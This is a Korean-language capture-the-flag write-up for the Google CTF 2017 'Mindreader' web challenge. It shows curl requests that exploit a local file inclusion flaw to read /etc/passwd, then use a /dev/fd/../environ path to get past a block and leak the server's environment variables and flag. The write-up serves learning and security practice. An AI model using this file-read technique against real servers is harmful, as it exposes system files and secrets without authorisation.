---
layout: post
title:  "[Google CTF 2017] Mindreader"
date:   2017-06-19
excerpt: "Mindreader"
tag:
- Google CTF
- Web
- Writeup
---

## Description

> Can you read my mind?
> Challenge running at [https://mindreader.web.ctfcompetition.com/][1]

## Exploit

문제 페이지는 다음과 같다.

```html
<html>
<head>
</head>
<body>
    <p>Hello, what do you want to read?</p>
    <form method="GET">
        <input type="text" name="f">
        <input type="submit" value="Read">
    </form>
</body>
</html>
```
`https://mindreader.web.ctfcompetition.com/?f=` 와 같은 방법으로 파일 내부를 볼 수 있는 것 같다.

단순 LFI 문제처럼 보인다.

시험삼아 `/etc/passwd`를 호출해보았다.

```bash
osehun-ui-MacBook-Pro:~ osehun$ curl "https://mindreader.web.ctfcompetition.com/?f=/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
```

정상적으로 `/etc/passwd`가 호출됨을 알 수 있다.

하지만 어느 폴더에 어떤 파일이 존재하는지 모르기에 `/proc/self/environ`을 열어보기로 했다.

```bash
osehun-ui-MacBook-Pro:~ osehun$ curl "https://mindreader.web.ctfcompetition.com/?f=/proc/self/environ"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don\'t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

권한이 없음을 확인할 수 있으므로, `/proc/self/environ`을 다른 방법으로 열어보자.

```bash
parallels@ubuntu:~$ ls -al /dev/fd
lrwxrwxrwx 1 root root 13 May 27 01:57 /dev/fd -> /proc/self/fd
parallels@ubuntu:~$ ls -al /dev/fd/../environ
-r-------- 1 parallels parallels 0 Jun 19 15:24 /dev/fd/../environ
```

위와 같은 방법으로 `environ`을 열 수 있다.

`/dev/fd/../environ`을 서버에 요청해보자.

```bash
osehun-ui-MacBook-Pro:~ osehun$ curl "https://mindreader.web.ctfcompetition.com/?f=/dev/fd/../environ"

GAE_MEMORY_MB=614HOSTNAME=01a857a265fb
GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170618t144344-dv60
PORT=8080
HOME=/root
PYTHONUNBUFFERED=1
GAE_SERVICE=mindreader-sss6w3uqjfrcntmn
PATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGAE_DEPLOYMENT_ID=402060873983974243
LANG=C.UTF-8
DEBIAN_FRONTEND=noninteractive
GCLOUD_PROJECT=ctf-web-kuqo48d
GOOGLE_CLOUD_PROJECT=ctf-web-kuqo48d
CHALLENGE_NAME=mindreader
VIRTUAL_ENV=/envPWD=/home/vmagent/app
GAE_VERSION=20170618t144344
FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}
```

Flag를 얻을 수 있다.

Flag is `CTF{ee02d9243ed6dfcf83b8d520af8502e1}`

[1]: https://mindreader.web.ctfcompetition.com/
